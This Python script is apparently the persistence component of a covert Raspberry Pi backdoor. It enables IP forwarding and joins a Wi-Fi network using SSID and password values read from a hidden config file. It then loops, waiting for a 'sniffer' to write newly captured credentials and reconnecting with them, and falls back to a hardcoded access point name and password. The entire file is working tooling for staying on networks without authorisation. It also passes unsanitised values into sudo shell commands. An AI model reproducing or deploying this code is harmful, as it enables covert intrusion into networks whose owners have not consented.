#!/usr/bin/env python3
import os
import socket
import time

FILE_CONFIG='/home/pi/.BACKDOOR/PERSISTANCE/CONFIG.txt'

os.system('clear')
os.system('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')

def GET_CONFIG(FILE_CONFIG):
    global MODE,SSID,PASSWORD,USERGUI,PASSGUI,INTERFACE
    with open(FILE_CONFIG, mode='r') as f:
        DATA=f.read().split(':')
        SSID=DATA[1]
        PASSWORD=DATA[2]
        return DATA

def CHECK_INTERNET(IP, PORT):
    global MYIP
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.0.254", 80))
        MYIP=s.getsockname()[0]
        #socket.close
        return True
    except socket.error as ex:
        #socket.close
        return False

GET_CONFIG(FILE_CONFIG)
os.system('sudo /home/pi/.BACKDOOR/PERSISTANCE/CONNECT.sh "'+SSID+'" "'+PASSWORD+'">/dev/null')
time.sleep(20)
while True:
    a=1
    if CHECK_INTERNET('192.168.0.254',80):
        print('[+] WAITING CREDENTIALS...................[WAITING]')
        data=GET_CONFIG(FILE_CONFIG)
        olddata=GET_CONFIG(FILE_CONFIG)
        while data == olddata: # IF FILE CONFIG CHANGED BY SNIFFER
            if not CHECK_INTERNET('192.168.0.254',80):
                a=0
                break
            time.sleep(10)
            olddata=GET_CONFIG(FILE_CONFIG)
        if a == 0:
            os.system('clear')
            print('[+] CONNEXION LOST............................[+]')
        else:
            print('[+] CONFIG CHANGED!...........................[OK]')
            print('[+] CONNECTING WITH NEW CREDS!................[OK]')
            os.system('sudo /home/pi/.BACKDOOR/PERSISTANCE/CONNECT.sh "'+SSID+'" "'+PASSWORD+'">/dev/null')
            time.sleep(20)
    else:
        GET_CONFIG(FILE_CONFIG)
        time.sleep(10)
        os.system('sudo /home/pi/.BACKDOOR/PERSISTANCE/CONNECT.sh "'+SSID+'" "'+PASSWORD+'">/dev/null')
        time.sleep(20)
        if CHECK_INTERNET('192.168.0.254',80):
            print('[+] PERSISTANCE RÉUSSI!......................[OK]')
        else:
            print('[+] TRYING DEFAULT CONFIG [+]')
            os.system('sudo /home/pi/.BACKDOOR/PERSISTANCE/CONNECT.sh TP-LINK_AP_F350 85460256 >/dev/null')
            time.sleep(20)
